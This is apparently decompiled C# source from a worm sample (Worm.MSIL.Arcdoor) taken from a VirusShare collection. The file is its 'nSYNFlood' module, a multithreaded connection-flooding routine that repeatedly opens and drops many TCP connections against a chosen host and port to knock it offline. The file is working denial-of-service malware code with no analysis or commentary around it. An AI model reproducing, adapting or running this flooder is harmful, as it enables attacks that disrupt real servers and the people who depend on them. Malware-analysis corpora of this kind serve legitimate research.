// Decompiled with JetBrains decompiler
// Type: SysDriver.nSYNFlood
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591752E5-2C24-490A-AF88-A636AB72D7B7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Worm.MSIL.Arcdoor.ae-9a70c0fa82dd869c7b769f53a0f2f245e58c379690ba2933aaf80f8e9c831958.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver
{
  internal class nSYNFlood
  {
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    public static string sFHost;
    private static IPEndPoint IPEo;
    public static ushort uPort;
    private static nSYNFlood.SYNRequest[] SYNClass;
    public static int iSSockets;
    public static int iThreads;

    public static void StartSYNFlood()
    {
      try
      {
        nSYNFlood.IPEo = new IPEndPoint(Dns.GetHostEntry(nSYNFlood.sFHost).AddressList[0], (int) nSYNFlood.uPort);
      }
      catch
      {
        nSYNFlood.IPEo = new IPEndPoint(IPAddress.Parse(nSYNFlood.sFHost), (int) nSYNFlood.uPort);
      }
      nSYNFlood.tFloodingThread = new Thread[nSYNFlood.iThreads];
      nSYNFlood.tFloodingJob = new ThreadStart[nSYNFlood.iThreads];
      nSYNFlood.SYNClass = new nSYNFlood.SYNRequest[nSYNFlood.iThreads];
      for (int index = 0; index < nSYNFlood.iThreads; ++index)
      {
        nSYNFlood.SYNClass[index] = new nSYNFlood.SYNRequest(nSYNFlood.IPEo, nSYNFlood.iSSockets);
        nSYNFlood.tFloodingJob[index] = new ThreadStart(nSYNFlood.SYNClass[index].Send);
        nSYNFlood.tFloodingThread[index] = new Thread(nSYNFlood.tFloodingJob[index]);
        nSYNFlood.tFloodingThread[index].Start();
      }
    }

    public static void StopSYNFlood()
    {
      for (int index = 0; index < nSYNFlood.iThreads; ++index)
      {
        try
        {
          nSYNFlood.tFloodingThread[index].Abort();
          nSYNFlood.tFloodingThread[index].Join();
        }
        catch
        {
        }
      }
    }

    private class SYNRequest
    {
      private IPEndPoint IPEo;
      private Socket[] pSocket;
      private int iSSockets;

      public SYNRequest(IPEndPoint tIPEo, int tSSockets)
      {
        this.IPEo = tIPEo;
        this.iSSockets = tSSockets;
      }

      private void OnConnect(IAsyncResult ar)
      {
      }

      public void Send()
      {
label_0:
        try
        {
          while (true)
          {
            this.pSocket = new Socket[this.iSSockets];
            for (int index = 0; index < this.iSSockets; ++index)
            {
              this.pSocket[index] = new Socket(this.IPEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
              this.pSocket[index].Blocking = false;
              AsyncCallback callback = new AsyncCallback(this.OnConnect);
              this.pSocket[index].BeginConnect((EndPoint) this.IPEo, callback, (object) this.pSocket[index]);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.iSSockets; ++index)
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            this.pSocket = (Socket[]) null;
          }
        }
        catch
        {
          for (int index = 0; index < this.iSSockets; ++index)
          {
            try
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            catch
            {
            }
          }
          goto label_0;
        }
      }
    }
  }
}
